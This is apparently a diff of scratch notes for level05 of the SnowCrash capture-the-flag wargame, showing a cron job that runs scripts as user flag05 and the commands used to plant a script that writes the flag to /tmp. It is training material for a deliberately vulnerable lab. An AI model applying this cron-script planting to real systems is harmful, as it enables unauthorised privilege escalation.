@@ -1,2 +1,12 @@
 find / -user flag05 2>/dev/null
-setfacl -u level05:--x /rofs/usr/sbin/openarenaserver
+cat /usr/sbin/openarenaserver
+
+level06@SnowCrash:/var/mail$ ls
+level05
+level06@SnowCrash:/var/mail$ cat level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+
+getflag > /tmp/flag.txt" 
+cp -p test.sh /opt/openarenaserver/
+cat /tmp/flag.txt
